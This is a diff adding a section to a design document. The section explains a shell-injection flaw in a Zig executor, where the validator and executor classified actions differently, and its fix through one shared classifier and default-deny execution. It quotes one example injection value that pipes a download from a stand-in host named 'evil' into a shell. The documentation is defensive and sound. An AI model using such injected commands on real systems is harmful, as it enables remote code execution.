@@ -778,6 +778,39 @@ survives when the producer explicitly grants it; but a stranger who merely knows
 the id can no longer adopt a restricted producer's value. The receptor is an
 optional specificity layer over reference-based signaling, never a descent gate.
 
+## One classifier, default-deny execution — the binary refuses an unrecognized action (fork F8)
+
+> *And a stranger will they not follow, but will flee from him: for they know
+> not the voice of strangers.* (John 10:5)
+
+Biology: an immune system does not execute an unrecognized protein, and a body
+has ONE genome — not one gene-reader for intake and a different one for
+expression. The substrate had two: the VALIDATOR classified a declared action
+through `libcontract/src/pointer.zig::isKnownAction` (accept/reject the
+envelope), while the EXECUTOR classified the SAME action through the separate
+`zig/src/pointer.zig::inferPointerType` (decide what to run). They disagreed:
+nine typed doctrine pointers (`word:`, `validate:`, `signed:`, `modality:`,
+`wrapper:`, `iterate:`, and `neuron:`/`funnel:`/`sequence:` subtypes) were
+blessed by the validator but had no branch in the executor's classifier, so they
+fell through to `runAction`'s `sh -c "<action>"` fall-through — a
+**shell-injection surface** (an action of `word:; curl evil | sh` passes
+validation, then breaks out at the shell).
+
+Two-part collapse (both required — unifying the classifier alone is
+insufficient, because `runAction` still shell-executes anything without a
+branch):
+
+1. **One genome.** The executor's classifier (`zig/src/pointer.zig`) now
+   recognizes the same typed prefixes the validator does, so a `word:` action
+   classifies as the inert kind `word`, never the executable `cli`.
+2. **Default-deny at the exec fall-through.** `runAction` shell-executes ONLY a
+   genuine executable ptype — `cli`/`api` shell commands, a `loop-until:` body,
+   or a `harness:` verify.sh. Every other ptype reaching the fall-through is a
+   typed pointer with no executor branch and is **HELD** (`hold:inert-pointer`),
+   exactly as `agent-judges` is held — never run as a shell command. Adding a
+   new executable shape means adding it to the allow-list, a security-positive
+   default: an unregistered typed pointer is refused, not executed.
+
 ## Channel registry — every contact channel is a contract
 
 Every channel through which the substrate can reach the user is its
